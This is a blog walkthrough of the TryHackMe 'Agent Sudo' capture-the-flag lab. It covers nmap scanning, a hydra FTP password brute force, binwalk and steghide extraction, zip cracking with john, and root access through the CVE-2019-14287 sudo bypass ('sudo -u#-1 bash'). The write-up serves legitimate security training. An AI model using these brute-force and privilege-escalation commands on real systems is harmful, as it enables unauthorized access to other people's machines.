+++
title = "THM: Agent Sudo -- Write-Up"
description = "Walkthrough write-up of the TryHackMe AgentSudo CTF"
type = ["posts","post"]
tags = [
    "blog",
    "tryhackme",
    "gobuster",
    "nmap",
    "hydra",
    "binwalk",
    "johntheripper",
    "stegcracker",
    "steghide"
]
date = "2022-05-23T14:14:00"
categories = [
    "ctf",
    "TryHackMe",
]
[ author ]
  name = "Rob"
+++
## About 
[TryHackMe.com](https://tryhackme.com/)'s [Agent Sudo](https://tryhackme.com/room/agentsudoctf) is a beginner-friendly capture-the-flag virtual machine by [DesKel](https://tryhackme.com/p/DesKel). Agent Sudo has a secret agent theme and challenges users to capture two flags and gain root access by locating and decrypting a series of confidential communications. 

### Note
I have replaced all instances of the virtual machine's ip address with `<target-ip>` throughout this write-up.

## Methodology

We begin our enumeration efforts by running an `nmap` scan on the target machine to understand the ports that are open to network traffic. I start with the `-V`, `-C`, and `-T4` flags. 

```bash
# Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253
Nmap scan report for 10.10.166.253
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 23 09:24:05 2022 -- 1 IP address (1 host up) scanned in 12.65 seconds
```
Now we know that the target is running `vsftpd 3.0.3` on `port 21`, `OpenSSH 7.6p1` on `port 22`, and an `Apache httpd 2.4.29` web server on `port 80` with the `http-title` of `announcement` - all open to `tcp` traffic. 

Next, we visit the web server in a web browser.

`/index.html`
```html
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```
We're greeted with a message from Agent R, instructing other agents to change their `user-agent` to thier codename for site access. Here I used [User-Agent Switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) to alter my requests. I began by trying to log in as the boss, chaning my user agent to "R". Unfortunately, we're given a hostile response by the administrator (presumably R himself) for this request:
```html
<head>   
</head>
<body>What are you doing! Are you one of the 25 employees? If not, I going to report this incident



	<title>Annoucement</title>



<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>


</body>
```

Likewise, user-agents `A` and `B` do not work, but `C` redirects us to `/agent_C_attention.php` on the web site:
```html
Attention ----s, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```
Out of curiosity, I tried `J` as a user-agent, but that did not yield anything. However, now that we know about a user named `----s`, we should see if we can access the vsftpd FTP server on port 21. I chose to use `hydra` to attempt to brute force the server. This process went extremely slowly, unfortunately, with several disconnections from the remote host. I assume that this has to do with some form of rate limiting.

```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ hydra -t 1 -l ----s -P /usr/share/wordlists/rockyou.txt -vV 10.10.73.189 ftp
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-23 10:19:49
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking ftp://10.10.73.189:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "12345" - 2 of 14344400 [child 0] (0/1)
[STATUS] 2.00 tries/min, 2 tries in 00:01h, 14344398 to do in 119536:40h, 1 active
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "123456789" - 3 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "password" - 4 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "iloveyou" - 5 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "princess" - 6 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "1234567" - 7 of 14344401 [child 0] (0/2)

... 🕒 two hours later 🕒 ...

[ATTEMPT] target 10.10.73.189 - login "----s" - pass "cutie" - 243 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "james" - 244 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "banana" - 245 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "prince" - 246 of 14344401 [child 0] (0/2)
[STATUS] 7.94 tries/min, 246 tries in 00:31h, 14344155 to do in 30126:37h, 1 active
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "friend" - 247 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "jesus1" - 248 of 14344401 [child 0] (0/2)
[ATTEMPT] target 10.10.73.189 - login "----s" - pass "------l" - 249 of 14344401 [child 0] (0/2)
[21][ftp] host: 10.10.73.189   login: ----s   password: ------l
[STATUS] attack finished for 10.10.73.189 (waiting for children to complete tests)

```
We test out our new credentials and discover three files on the FTP server that we can get. We download the text message first.
```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ ftp 10.10.73.189 
Connected to 10.10.73.189.
220 (vsFTPd 3.0.3)
Name (10.10.73.189:virtualtack): ----s
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||20720|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||35196|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |************|   217       75.79 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (1.69 KiB/s)
ftp> exit
221 Goodbye.                                                    
```

`To_agentJ.txt`
```shell
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Good to know! Let's grab the image files and figure out how to extract Agent J's login password.

```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ ftp 10.10.73.189 
Connected to 10.10.73.189.
220 (vsFTPd 3.0.3)
Name (10.10.73.189:virtualtack): ----s
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||27749|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||13011|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |************| 33143      308.57 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (154.69 KiB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||63920|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |************| 34842      322.63 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (158.37 KiB/s)
ftp> quit
221 Goodbye.
```
I should have used `mget *` here instead. Looking at the two images, I don't see anything immediately interesting. They are cute, though. 

I spent a while viewing the files but don't get anywhere. So I consult the internet. Turns out the clever agents hid a text string inside a data file [you can do this with binaries, too](https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/). Apparently everyone on the internet uses `binwalk` for this scenario. [Binwalk](https://www.kali.org/tools/binwalk/) is a tool for searching a given binary image for embedded files and executable code. Specifically, it is designed for identifying files and code embedded inside of firmware images. They must teach this stuff at spy school.

Let's binwalk...
```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

`binwalk`, in its omnipotence, has a function to extract known file types, using the `-e` flag.

We also now have the extracted contents of `cutie.png`
```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  To_agentR.txt
```

Let's unzip the archive:
```shell                                                            
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ 7z x 8702.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz (906E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt
                    
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1

```

Usually `zip` passwords are pretty easy to break in CTFs. Let's see if that's true here:

```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > 4john
                                                                    
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  4john  8702.zip  To_agentR.txt

──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ john 4john
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
----n            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2022-05-23 11:42) 1.587g/s 72174p/s 72174c/s 72174C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

It is true. Now we can use `----n` to access the archive and read the contents of `To_agentR.txt`.
```text
Agent C,

We need to send the picture to '-------x' as soon as possible!

By,
Agent R

```

As the result of doing a few CTFs, the name of the picture recipient looks suspiciously like it is encoded in base64. As a reminder: **base64 is not encryption**. This is apparently a [big deal](https://twitter.com/sempf/status/988525614444539904) [for kubernetes folks](https://github.com/sethvargo/base64-is-not-encryption). 

```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ touch -------x.txt
                                                                    
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ vim -------x.txt
                                                                    
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
└─$ base64 -d '-------x.txt'
-----1   
```

Reading other write-ups after finishing the box, I learned about [Cyber Chef](https://gchq.github.io/CyberChef/) which looks great for stuff like this in the future.

The next prompt on THM asks for the `steg password`. I don't know what that is, so I search for it and [stegcracker](https://www.kali.org/tools/stegcracker/) tops the list. Let's try it, in conjunction with our remaining alien image `cute-alien.jpg`

```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ stegcracker cute-alien.jpg
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2022 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
"steghidewill blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'cute-alien.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
```

Next time, I will definitely try [StegSeek](https://github.com/RickdeJager/stegseek)! This is going insanely slowly, so I think it's probably not the right way to go. However, the ftp brute-force above took ages too. I'll let it run in the background while I google other steg stuff. 

I learned about [Stegsolve](https://wiki.bi0s.in/steganography/stegsolve/) which is a really cool little utility, but, sadly, not helpful here. The next thing to try is [steghide](https://www.kali.org/tools/steghide/):

```shell
                                                         
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ steghide --extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
                                                         
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ cat message.txt
Hi ----s,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
----s
```

Coincidentally, the lethargic StegCracker process also just finished, giving us another route to the message.

```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ stegcracker cute-alien.jpg
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2022 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'cute-alien.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: -----1doro1111
Tried 441203 passwords
Your file has been written to: cute-alien.jpg.out
-----1
                                                         
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ cat cute-alien.jpg.out
Hi ----s,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
----s    
```

Let's log in via `ssh` and find our user flag.
```shell
┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
└─$ ssh ----s@10.10.108.206
----s@10.10.108.206's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon May 23 16:28:05 UTC 2022

  System load:  1.07              Processes:           99
  Usage of /:   39.8% of 9.78GB   Users logged in:     0
  Memory usage: 19%               IP address for eth0: 10.10.108.206
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
----s@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
----s@agent-sudo:~$ cat user_flag.txt
🎌`user flag`🎌
----s@agent-sudo:~$ 

```

While the secret agents certainly have more knowledge about image-based cryptography, I spot that they've misspelled "autopsy" in the image file name, which, despite being a tiny victory helps my ego.

Now let's try to get root. First, I check to see what our friend `----s` has `sudo` permissions to run:

```shell
----s@agent-sudo:~$ sudo -l
[sudo] password for ----s: 
Matching Defaults entries for ----s on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ----s may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Well, that is lucky. I immediately google this command and discover CVE-2019-14287. This exploit works due to some remarkably simple logic. The security policy applied – which allows `----s` to run `bash` as any user except root – is quite sensible. However, unfortunately, `sudo` faithfully interprets `#-1` after the `-u` user flag and, upon checking for user number `-1`,  will run as user `0`: `root`.

```shell     
----s@agent-sudo:~$ sudo -u#-1 bash
root@agent-sudo:~# whoami
root
```

This can also be done with `4294967295` instead of `-u`. h/t [WhiteSource](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/)

```shell
----s@agent-sudo:~$ sudo -u#4294967295 bash
[sudo] password for ----s: 
root@agent-sudo:~# whoami
root
```

Pretty crazy! 

Now for the final spy message of the box:
```shell
root@agent-sudo:/# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
🎌root flag🎌

By,
-----l a.k.a Agent R

```

### Notes
I learned a lot from this box and enjoyed it a lot. In particular, I think building a familiarity with `binwalk` and the various tricks and utilities related to [steganography](https://en.wikipedia.org/wiki/Steganography) - concealing data in other data or objects - will be useful down the road. Understanding and using CVE-2019-14287 was quite helpful, as well.